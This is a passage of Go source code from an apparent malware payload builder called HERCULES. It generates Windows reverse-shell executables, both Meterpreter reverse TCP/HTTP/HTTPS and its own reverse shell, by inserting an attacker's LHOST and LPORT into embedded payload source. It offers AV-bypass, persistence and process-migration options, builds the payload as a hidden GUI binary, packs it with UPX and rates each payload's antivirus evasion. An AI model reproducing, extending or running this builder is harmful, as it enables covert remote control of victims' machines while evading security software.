  if (!(strings.Contains(string(DirList), "EGESPLOIT"))) && (!(strings.Contains(string(DirList2), "EGESPLOIT"))) {
    return false
  }

  if !(strings.Contains(string(GoVer), "version")) {
    return false
  }
  if !(strings.Contains(string(UPX), "Markus")) {
    return false
  }
  return true
}


func ChecVersion()  (string){//https://raw.githubusercontent.com/EgeBalci/HERCULES/master/SOURCE/HERCULES.go

  Response, Error := http.Get("https://raw.githubusercontent.com/EgeBalci/HERCULES/master/SOURCE/HERCULES.go")
  if Error != nil {
    return "[!] ERROR : Connection attempt failed"
  }
  Body, _ := ioutil.ReadAll(Response.Body)

  Version := string(`"`+VERSION+`"`)

  if !(strings.Contains(string(Body), Version)) {
    return "[!] New version detected"
  }else{
    return "[+] HERCULES is up to date"
  }

}


func PrintBanner()  {
  color.Red(" ██░ ██ ▓█████  ██▀███   ▄████▄   █    ██  ██▓    ▓█████   ██████ ")
  color.Red("▓██░ ██▒▓█   ▀ ▓██ ▒ ██▒▒██▀ ▀█   ██  ▓██▒▓██▒    ▓█   ▀ ▒██    ▒ ")
  color.Red("▒██▀▀██░▒███   ▓██ ░▄█ ▒▒▓█    ▄ ▓██  ▒██░▒██░    ▒███   ░ ▓██▄   ")
  color.Red("░▓█ ░██ ▒▓█  ▄ ▒██▀▀█▄  ▒▓▓▄ ▄██▒▓▓█  ░██░▒██░    ▒▓█  ▄   ▒   ██▒")
  color.Red("░▓█▒░██▓░▒████▒░██▓ ▒██▒▒ ▓███▀ ░▒▒█████▓ ░██████▒░▒████▒▒██████▒▒")
  color.Red(" ▒ ░░▒░▒░░ ▒░ ░░ ▒▓ ░▒▓░░ ░▒ ▒  ░░▒▓▒ ▒ ▒ ░ ▒░▓  ░░░ ▒░ ░▒ ▒▓▒ ▒ ░")
  color.Red(" ▒ ░▒░ ░ ░ ░  ░  ░▒ ░ ▒░  ░  ▒   ░░▒░ ░ ░ ░ ░ ▒  ░ ░ ░  ░░ ░▒  ░ ░")
  color.Red(" ░  ░░ ░   ░     ░░   ░ ░         ░░░ ░ ░   ░ ░      ░   ░  ░  ░  ")
  color.Red(" ░  ░  ░   ░  ░   ░     ░ ░         ░         ░  ░   ░  ░      ░  ")
  color.Red("                        ░                                         ")

}

func PrintCredit()  {
  Green := color.New(color.FgGreen)
  BoldGreen := Green.Add(color.Bold)
  color.Green("\n+ -- --=[        HERCULES  FRAMEWORK        ]")
  color.Green("+ -- --=[         Version: "+VERSION+"            ]")
  BoldGreen.Println("+ -- --=[            Ege Balcı              ]")
}


func Menu_1()  {
  Yellow := color.New(color.FgYellow)
  BoldYellow := Yellow.Add(color.Bold)
  White := color.New(color.FgWhite)
  UnderlinedWhite := White.Add(color.Underline)
  BoldYellow.Println("\n[1] GENERATE PAYLOAD ")
  BoldYellow.Println("\n[2] BIND PAYLOAD ")
  BoldYellow.Println("\n[3] UPDATE ")

  UnderlinedWhite.Print("\n\n[*] Select : ")
}

func PrintPayloads()  {

  White := color.New(color.FgWhite)
  BoldWhite := White.Add(color.Bold)
  Green := color.New(color.FgGreen)
  BoldGreen := Green.Add(color.Bold)


  fmt.Println("\n")
  BoldWhite.Println(" #===============================================================================#")
  BoldWhite.Println(" |     PAYLOAD                           |     SIZE/UPX     |  AV Evasion Score  |")
  BoldWhite.Println(" |~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~|~~~~~~~~~~~~~~~~~~|~~~~~~~~~~~~~~~~~~~~|")
  BoldWhite.Print("(1) Meterpreter Reverse TCP              |  946 KB / 262 KB |       ")
  BoldGreen.Print(" 8/10        ")
  BoldWhite.Println("|")
  BoldWhite.Println(" |                                       |                  |                    |")
  BoldWhite.Print("(2) Meterpreter Reverse HTTP             |  4.2 MB / 1.1 MB |       ")
  BoldGreen.Print(" 8/10        ")
  BoldWhite.Println("|")
  BoldWhite.Println(" |                                       |                  |                    |")
  BoldWhite.Print("(3) Meterpreter Reverse HTTPS            |  4.2 MB / 1.1 MB |       ")
  BoldGreen.Print(" 8/10        ")
  BoldWhite.Println("|")
  BoldWhite.Println(" |                                       |                  |                    |")
  BoldWhite.Print("(4) HERCULES REVERSE SHELL               |  4.4 MB / 1.1 MB |        ")
  BoldGreen.Print("7/10        ")
  BoldWhite.Println("|")
  BoldWhite.Println(" |                                       |                  |                    |")
  BoldWhite.Println(" #===============================================================================#")
  fmt.Println("\n")
}


func FinalView()  {
  Cyan := color.New(color.FgCyan)
  BoldCyan := Cyan.Add(color.Bold)
  Green := color.New(color.FgGreen)
  BoldGreen := Green.Add(color.Bold)
  Blue := color.New(color.FgBlue)
  BoldBlue := Blue.Add(color.Bold)
  Yellow := color.New(color.FgYellow)
  BoldYellow := Yellow.Add(color.Bold)
  Red := color.New(color.FgRed)
  BoldRed := Red.Add(color.Bold)
  White := color.New(color.FgWhite)
  BoldWhite := White.Add(color.Bold)
  ClearScreen()
  PrintBanner()

  if Payload.Type == 1 {
    BoldBlue.Println("#====================================================================================#")
    BoldBlue.Println("#     SELECTED PAYLOAD                       |     SIZE/UPX     |  AV Evasion Score  #")
    BoldBlue.Println("#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~|~~~~~~~~~~~~~~~~~~|~~~~~~~~~~~~~~~~~~~~#")
    BoldBlue.Print("# Meterpreter Reverse TCP                    | 946 KB / 262 KB  |        ")
    if Payload.Score < 5 {
      BoldRed.Print(Payload.Score)
    }else if Payload.Score == 5 {
      BoldYellow.Print(Payload.Score)
    }else {
      BoldGreen.Print(Payload.Score)
    }
    if Payload.Score == 10 {
      BoldGreen.Print("/10       ")
    }else{
      BoldGreen.Print("/10        ")
    }
    BoldBlue.Println("#")
    BoldBlue.Println("#====================================================================================#")
  }else if Payload.Type == 2 {
    BoldBlue.Println("#====================================================================================#")
    BoldBlue.Println("#     SELECTED PAYLOAD                       |     SIZE/UPX     |  AV Evasion Score  #")
    BoldBlue.Println("#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~|~~~~~~~~~~~~~~~~~~|~~~~~~~~~~~~~~~~~~~~#")
    BoldBlue.Print("# Meterpreter Reverse HTTP                   | 4.2 MB / 1.1 MB  |        ")
    if Payload.Score < 5 {
      BoldRed.Print(Payload.Score)
    }else if Payload.Score == 5 {
      BoldYellow.Print(Payload.Score)
    }else {
      BoldGreen.Print(Payload.Score)
    }
    if Payload.Score == 10 {
      BoldGreen.Print("/10       ")
    }else{
      BoldGreen.Print("/10        ")
    }
    BoldBlue.Println("#")
    BoldBlue.Println("#====================================================================================#")
  }else if Payload.Type == 3 {
    BoldBlue.Println("#====================================================================================#")
    BoldBlue.Println("#     SELECTED PAYLOAD                       |     SIZE/UPX     |  AV Evasion Score  #")
    BoldBlue.Println("#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~|~~~~~~~~~~~~~~~~~~|~~~~~~~~~~~~~~~~~~~~#")
    BoldBlue.Print("# Meterpreter Reverse HTTPS                  | 4.2 MB / 1.1 MB  |        ")
    if Payload.Score < 5 {
      BoldRed.Print(Payload.Score)
    }else if Payload.Score == 5 {
      BoldYellow.Print(Payload.Score)
    }else {
      BoldGreen.Print(Payload.Score)
    }
    if Payload.Score == 10 {
      BoldGreen.Print("/10       ")
    }else{
      BoldGreen.Print("/10        ")
    }
    BoldBlue.Println("#")
    BoldBlue.Println("#====================================================================================#")
  }else if Payload.Type == 4 {
    BoldBlue.Println("#====================================================================================#")
    BoldBlue.Println("#     SELECTED PAYLOAD                       |     SIZE/UPX     |  AV Evasion Score  #")
    BoldBlue.Println("#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~|~~~~~~~~~~~~~~~~~~|~~~~~~~~~~~~~~~~~~~~#")
    BoldBlue.Print("# HERCULES REVERSE SHELL                     | 4.4 MB / 1.1 MB  |        ")
    if Payload.Score < 5 {
      BoldRed.Print(Payload.Score)
    }else if Payload.Score == 5 {
      BoldYellow.Print(Payload.Score)
    }else {
      BoldGreen.Print(Payload.Score)
    }
    if Payload.Score == 10 {
      BoldGreen.Print("/10       ")
    }else{
      BoldGreen.Print("/10        ")
    }
    BoldBlue.Println("#")
    BoldBlue.Println("#====================================================================================#")
  }


  if Payload.Persistence == true {
    BoldCyan.Print("\n[*] Persistence : ON")
    BoldWhite.Print(" (")
    BoldRed.Print("-2")
    BoldWhite.Println(")")
  }
  if Payload.Migrate == true {
    BoldCyan.Print("\n[*] Migration : ON")
    BoldWhite.Print(" (")
    BoldRed.Print("-1")
    BoldWhite.Println(")")
  }

  if Payload.UPX == true {
    BoldCyan.Print("\n[*] UPX : ON")
    BoldWhite.Print(" (")
    BoldRed.Print("-3")
    BoldWhite.Println(")")
  }


  if Payload.Type == 1 {
    if Payload.UPX == true && (Payload.Persistence || Payload.Migrate ){
      BoldCyan.Println("\n[*] Payload Size : 326 KB")
    }else if Payload.UPX == true && !(Payload.Persistence || Payload.Migrate) {
      BoldCyan.Println("\n[*] Payload Size : 262 KB")
    }else if Payload.UPX == false && !(Payload.Persistence || Payload.Migrate ) {
      BoldCyan.Println("\n[*] Payload Size : 946 KB")
    }

  }else{
    if Payload.UPX == true {
      BoldCyan.Println("\n[*] Payload Size : " + Payload.UPX_Size)
    }else{
      BoldCyan.Println("\n[*] Payload Size : " + Payload.Size)
    }
  }


  PayloadName := strings.TrimSuffix(Payload.FileName, ".go")

  PayloadName += ".exe"

  BoldCyan.Println("\n[*] Payload saved at : /$HOME/" + PayloadName + "\n\n")


}


func CompilePayload()  {
  Yellow := color.New(color.FgYellow)
  BoldYellow := Yellow.Add(color.Bold)
  Red := color.New(color.FgRed)
  Warning := Red.Add(color.Bold)

  Payload.FileName += ".go"

  File, _ := os.Create(Payload.FileName)
  Source, _ := base64.StdEncoding.DecodeString(Payload.SourceCode)
  var SourceCode string

  if Payload.Type == 2 || Payload.Type == 3 {
    Address := string("\"http://" + Payload.Ip + ":" + Payload.Port + "/\"")
    SourceCode = strings.Replace(string(Source), string("\"http://127.0.0.1:8080/\""), string(Address), -1)
    if Payload.BypassAV == true {
      SourceCode = strings.Replace(string(SourceCode), "//import \"EGESPLOIT/RSE\"", "import \"EGESPLOIT/RSE\"", -1)
      SourceCode = strings.Replace(string(SourceCode), "//RSE.BypassAV(3)", "RSE.BypassAV(3)", -1)
    }
    if Payload.Persistence == true {
      SourceCode = strings.Replace(string(SourceCode), "//import \"EGESPLOIT/RSE\"", `import "EGESPLOIT/RSE"`, -1)
      SourceCode = strings.Replace(string(SourceCode), "//RSE.Persistence()", "RSE.Persistence()", -1)
    }
    if Payload.Migrate == true {
      SourceCode = strings.Replace(string(SourceCode), "//import \"EGESPLOIT/RSE\"", "import \"EGESPLOIT/RSE\"", -1)
      SourceCode = strings.Replace(string(SourceCode), "//RSE.Migrate(Addr, len(Shellcode))", "RSE.Migrate(Addr, len(Shellcode))", -1)
    }


    File.WriteString(SourceCode)

    BuildCommand_Args := string(`export GOOS=windows && export GOARCH=386 && go build -ldflags "-H windowsgui -s -w" ` + Payload.FileName)
    BoldYellow.Println("\n[*] Compiling payload...")
    BoldYellow.Println("\n[*] " + BuildCommand_Args)
    BuildCommand := exec.Command("sh", "-c", BuildCommand_Args)
    BuildCommand.Stdout = os.Stdout
    BuildCommand.Stderr = os.Stderr
    BuildCommand.Run()
    CleanFilesCommand := string("rm " + Payload.FileName)
    exec.Command("sh", "-c", CleanFilesCommand).Run()
    DirFiles, _ := exec.Command("sh", "-c", "ls").Output()
    FileName_No_Suffix := strings.TrimSuffix(Payload.FileName, ".go")
    if !(strings.Contains(string(DirFiles), FileName_No_Suffix)) {
      Warning.Println("\n[!] ERROR : Compile failed")
      os.Exit(1)
    }
    File.Close()
    MovePayload := string("mv " + FileName_No_Suffix + ".exe $HOME")
    exec.Command("sh", "-c", MovePayload).Run()




  }else if Payload.Type == 1 {
    var IP string = "[4]byte{"
    IP_Array := strings.Split(string(Payload.Ip), `.`)
    for i := 0; i < 4; i++ {
      if i == 3 {
        IP += (IP_Array[i] + ",")
        break
      }
      IP += (IP_Array[i] + "," + " ")
    }
    IP += "}}"

    SourceCode = strings.Replace(string(Source), `[4]byte{127,0,0,1}}`, IP, -1)
    SourceCode = strings.Replace(string(SourceCode), `5555`, Payload.Port, -1)
    if Payload.BypassAV == true {
      SourceCode = strings.Replace(string(SourceCode), "//import \"EGESPLOIT/RSE\"", "import \"EGESPLOIT/RSE\"", -1)
      SourceCode = strings.Replace(string(SourceCode), "//RSE.BypassAV(3)", "RSE.BypassAV(3)", -1)
    }

    if Payload.Persistence == true {
      SourceCode = strings.Replace(string(SourceCode), `//import "EGESPLOIT/RSE"`, `import "EGESPLOIT/RSE"`, -1)
      SourceCode = strings.Replace(string(SourceCode), `//RSE.Persistence()`, `RSE.Persistence()`, -1)
    }
    if Payload.Migrate == true {
      SourceCode = strings.Replace(string(SourceCode), `//import "EGESPLOIT/RSE"`, `import "EGESPLOIT/RSE"`, -1)
      SourceCode = strings.Replace(string(SourceCode), `//RSE.Migrate(Addr, int(Length_int))`, `RSE.Migrate(Addr, int(Length_int))`, -1)
    }


    File.WriteString(SourceCode)

    BuildCommand_Args := string(`export GOOS=windows && export GOARCH=386 && go build -ldflags "-H windowsgui -s -w" ` + Payload.FileName)
    BoldYellow.Println("\n[*] Compiling payload...")
    BoldYellow.Println("\n[*] " + BuildCommand_Args)
    BuildCommand := exec.Command("sh", "-c", BuildCommand_Args)
    BuildCommand.Stdout = os.Stdout
    BuildCommand.Stderr = os.Stderr
    BuildCommand.Run()
    CleanFilesCommand := string("rm " + Payload.FileName)
    exec.Command("sh", "-c", CleanFilesCommand).Run()
    DirFiles, _ := exec.Command("sh", "-c", "ls").Output()
    FileName_No_Suffix := strings.TrimSuffix(Payload.FileName, ".go")
    if !(strings.Contains(string(DirFiles), FileName_No_Suffix)) {
      Warning.Println("\n[!] ERROR : Compile failed")
      os.Exit(1)
    }
    File.Close()
    MovePayload := string("mv " + FileName_No_Suffix + ".exe $HOME")
    exec.Command("sh", "-c", MovePayload).Run()

  }else if Payload.Type == 4 {
    Payload.Ip = string(`"`+Payload.Ip+`"`)
    Payload.Port = string(`"`+Payload.Port+`"`)
    SourceCode = strings.Replace(string(Source), `"10.10.10.84"`, Payload.Ip, -1)
    SourceCode = strings.Replace(string(SourceCode), `"5555"`, Payload.Port, -1)

    File.WriteString(SourceCode)

    BuildCommand_Args := string(`export GOOS=windows && export GOARCH=386 && go build -ldflags "-H windowsgui -s -w" ` + Payload.FileName)
    BoldYellow.Println("\n[*] Compiling payload...")
    BoldYellow.Println("\n[*] " + BuildCommand_Args)
    BuildCommand := exec.Command("sh", "-c", BuildCommand_Args)
    BuildCommand.Stdout = os.Stdout
    BuildCommand.Stderr = os.Stderr
    BuildCommand.Run()
    CleanFilesCommand := string("rm " + Payload.FileName)
    exec.Command("sh", "-c", CleanFilesCommand).Run()
    DirFiles, _ := exec.Command("sh", "-c", "ls").Output()
    FileName_No_Suffix := strings.TrimSuffix(Payload.FileName, ".go")
    if !(strings.Contains(string(DirFiles), FileName_No_Suffix)) {
      Warning.Println("\n[!] ERROR : Compile failed")
      os.Exit(1)
    }
    File.Close()
    MovePayload := string("mv " + FileName_No_Suffix + ".exe $HOME")
    exec.Command("sh", "-c", MovePayload).Run()

  }

}

func AskMigrate()  {
  Red := color.New(color.FgRed)
  Warning := Red.Add(color.Bold)
  Yellow := color.New(color.FgYellow)
  BoldYellow := Yellow.Add(color.Bold)
  BoldYellow.Print("\n[?] ")
  fmt.Print("Do you want to add migration function to payload (y/n) :")
  fmt.Scan(&Ask)
  if Ask == "y" || Ask == "Y" {
    Warning.Print("\n[!] Adding migration will decreases the AV Evasion Score and increase the paylaod size, do you still want to continue (Y/n) :")
    fmt.Scan(&Ask)
    if Ask == "y" || Ask == "Y"{
      Payload.Migrate = true
      Payload.Score = (Payload.Score - 1)
    }else{
        Payload.Migrate = false
    }
  }else{
      Payload.Migrate = false
  }
}




func AskPersistence()  {
  Red := color.New(color.FgRed)
  Warning := Red.Add(color.Bold)
  Yellow := color.New(color.FgYellow)
  BoldYellow := Yellow.Add(color.Bold)
  BoldYellow.Print("\n[?] ")
  fmt.Print("Do you want to add persistence function to payload (y/n) :")
  fmt.Scan(&Ask)
  if Ask == "y" || Ask == "Y" {
    Warning.Print("\n[!] Adding persistence will decreases the AV Evasion Score and increase the paylaod size, do you still want to continue (Y/n) :")
    fmt.Scan(&Ask)
    if Ask == "y" || Ask == "Y"{
      Payload.Persistence = true
      Payload.Score = (Payload.Score - 2)
    }else{
        Payload.Persistence = false
    }
  }else{
      Payload.Persistence = false
  }
}

func AskBypassAV()  {
  Red := color.New(color.FgRed)
  Warning := Red.Add(color.Bold)
  Yellow := color.New(color.FgYellow)
  BoldYellow := Yellow.Add(color.Bold)
  BoldYellow.Print("\n[?] ")
  fmt.Print("Do you want to add Bypass AV function to payload (y/n) :")
  fmt.Scan(&Ask)
  if Ask == "y" || Ask == "Y" {
    Warning.Print("\n[!] Adding Bypass AV will increase the paylaod size, do you still want to continue (Y/n) :")
    fmt.Scan(&Ask)
    if Ask == "y" || Ask == "Y"{
      Payload.BypassAV = true
      Payload.Score = (Payload.Score + 2)
    }else{
        Payload.BypassAV = false
    }
  }else{
      Payload.BypassAV = false
  }
}




func AskUPX()  {
  Red := color.New(color.FgRed)
  Warning := Red.Add(color.Bold)
  Yellow := color.New(color.FgYellow)
  BoldYellow := Yellow.Add(color.Bold)
  BoldYellow.Print("\n[?] ")
  fmt.Print("Do you want to compress the payload with UPX (y/n) :")
  fmt.Scan(&Ask)
  if Ask == "y" || Ask == "Y" {
    Warning.Print("\n[!] Compressing payloads with UPX decreases the AV Evasion Score, do you still want to continue (Y/n) :")
    fmt.Scan(&Ask)
    if Ask == "y" || Ask == "Y"{
      Payload.UPX = true
      Payload.Score = (Payload.Score - 3)
      ClearScreen()
      PrintBanner()

      ExeName := strings.TrimSuffix(Payload.FileName, ".go")
      ExeName += ".exe"
      UPX_Command := string("upx --brute " + ExeName)
      UPX := exec.Command("sh", "-c", UPX_Command)
      UPX.Stdout = os.Stdout
      UPX.Run()
    }else{
        Payload.UPX = false
    }
  }else{
      Payload.UPX = false
  }
}


func ClearScreen()  {
  Clear := exec.Command("clear")
  Clear.Stdout = os.Stdout
  Clear.Run()
}







func PreparePayload(No int)  {

  Blue := color.New(color.FgBlue)
  BoldBlue := Blue.Add(color.Bold)
  Green := color.New(color.FgGreen)
  BoldGreen := Green.Add(color.Bold)
  Red := color.New(color.FgRed)
  Warning := Red.Add(color.Bold)


  if No == 1 {
    Payload.Type = 1
    Payload.Size = "946 KB"
    Payload.FullSize = "1.1 MB"
    Payload.MidSize = "326 KB"
    Payload.UPX_Size = "262 KB"
    Payload.Score = 8
    Payload.SourceCode = METERPRETER_TCP

    ClearScreen()
    PrintBanner()

    BoldBlue.Println("#====================================================================================#")
    BoldBlue.Println("#     SELECTED PAYLOAD                       |     SIZE/UPX     |  AV Evasion Score  #")
    BoldBlue.Println("#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~|~~~~~~~~~~~~~~~~~~|~~~~~~~~~~~~~~~~~~~~#")
    BoldBlue.Print("# Meterpreter Reverse TCP                    | 946 KB / 262 KB  |       ")
    BoldGreen.Print(" 8/10        ")
    BoldBlue.Println("#")
    BoldBlue.Println("#====================================================================================#")

    for  ;;  {
      var IP string
      fmt.Print("\n\n[*] Enter LHOST : ")
      fmt.Scan(&IP)
      if (len(IP) < 7) || (len(IP) > 15) {
        Warning.Println("\n\n[!] ERROR : Invalid ip")
      }else{
        Payload.Ip = IP
        break
      }

    }

    for  ;;  {
      var PORT string
      fmt.Print("\n[*] Enter LPORT : ")
      fmt.Scan(&PORT)
      _, err := strconv.Atoi(PORT)
      if err == nil {
        Payload.Port = PORT
        break
      }
      Warning.Println("\n\n[!] ERROR : Invalid port")

    }
      AskPersistence()
      AskMigrate()
      AskBypassAV()


  }else if No == 2 {

    Payload.Type = 2
    Payload.Size = "4.2 MB"
    Payload.UPX_Size = "1.1 KB"
    Payload.Score = 8
    Payload.SourceCode = METERPRETER_HTTP_HTTPS

    ClearScreen()
    PrintBanner()

    BoldBlue.Println("#====================================================================================#")
    BoldBlue.Println("#     SELECTED PAYLOAD                       |     SIZE/UPX     |  AV Evasion Score  #")
    BoldBlue.Println("#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~|~~~~~~~~~~~~~~~~~~|~~~~~~~~~~~~~~~~~~~~#")
    BoldBlue.Print("# Meterpreter Reverse HTTP                   | 4.2 MB / 1.1 MB  |       ")
    BoldGreen.Print(" 8/10        ")
    BoldBlue.Println("#")
    BoldBlue.Println("#====================================================================================#")

    for  ;;  {
      var IP string
      fmt.Print("\n\n[*] Enter LHOST : ")
      fmt.Scan(&IP)
      if (len(IP) < 7) || (len(IP) > 15) {
        Warning.Println("\n\n[!] ERROR : Invalid ip")
      }else{
        Payload.Ip = IP
        break
      }

    }

    for  ;;  {
      var PORT string
      fmt.Print("\n[*] Enter LPORT : ")
      fmt.Scan(&PORT)
      _, err := strconv.Atoi(PORT)
      if err == nil {
        Payload.Port = PORT
        break
      }
      Warning.Println("\n\n[!] ERROR : Invalid port")

    }


    AskPersistence()
    AskMigrate()


   }else if No == 3 {
    Payload.Type = 3
    Payload.Size = "4.2 MB"
    Payload.Score = 8
    Payload.SourceCode = METERPRETER_HTTP_HTTPS

    ClearScreen()
    PrintBanner()

    BoldBlue.Println("#====================================================================================#")
    BoldBlue.Println("#     SELECTED PAYLOAD                       |     SIZE/UPX     |  AV Evasion Score  #")
    BoldBlue.Println("#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~|~~~~~~~~~~~~~~~~~~|~~~~~~~~~~~~~~~~~~~~#")
    BoldBlue.Print("# Meterpreter Reverse HTTPS                  | 4.2 MB / 1.1 MB  |       ")
    BoldGreen.Print(" 8/10        ")
    BoldBlue.Println("#")
    BoldBlue.Println("#====================================================================================#")

    for  ;;  {
      var IP string
      fmt.Print("\n\n[*] Enter LHOST : ")
      fmt.Scan(&IP)
      if (len(IP) < 7) || (len(IP) > 15) {
        Warning.Println("\n\n[!] ERROR : Invalid ip")
      }else{
        Payload.Ip = IP
        break
      }

    }

    for  ;;  {
      var PORT string
      fmt.Print("\n[*] Enter LPORT : ")
      fmt.Scan(&PORT)
      _, err := strconv.Atoi(PORT)
      if err == nil {
        Payload.Port = PORT
        break
      }
      Warning.Println("\n\n[!] ERROR : Invalid port")

    }

    AskPersistence()
    AskMigrate()



  }else if No == 4 {
    Payload.Type = 4
    Payload.Size = "4.4 MB"
    Payload.Score = 9
    Payload.SourceCode = HERCULES_REVERSE_SHELL

    ClearScreen()
    PrintBanner()

    BoldBlue.Println("#====================================================================================#")
    BoldBlue.Println("#     SELECTED PAYLOAD                       |     SIZE/UPX     |  AV Evasion Score  #")
    BoldBlue.Println("#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~|~~~~~~~~~~~~~~~~~~|~~~~~~~~~~~~~~~~~~~~#")
    BoldBlue.Print("# HERCULES REVERSE SHELL                     | 4.4 MB / 1.1 MB  |        ")
    BoldGreen.Print("7/10        ")
    BoldBlue.Println("#")
    BoldBlue.Println("#====================================================================================#")

    for  ;;  {
      var IP string
      fmt.Print("\n\n[*] Enter LHOST : ")
      fmt.Scan(&IP)
      if (len(IP) < 7) || (len(IP) > 15) {
        Warning.Println("\n\n[!] ERROR : Invalid ip")
      }else{
        Payload.Ip = IP
        break
      }

    }

    for  ;;  {
      var PORT string
      fmt.Print("\n[*] Enter LPORT : ")
      fmt.Scan(&PORT)
      _, err := strconv.Atoi(PORT)
      if err == nil {
        Payload.Port = PORT
        break
      }
      Warning.Println("\n\n[!] ERROR : Invalid port")

    }



  }else {

    ClearScreen()
    PrintBanner()
    PrintPayloads()

    Warning.Println("\n[!] ERROR : Invalid choise\n")

    fmt.Print("\n\n[*] Select : ")
    fmt.Scan(&NO)

    PreparePayload(NO)

  }

}
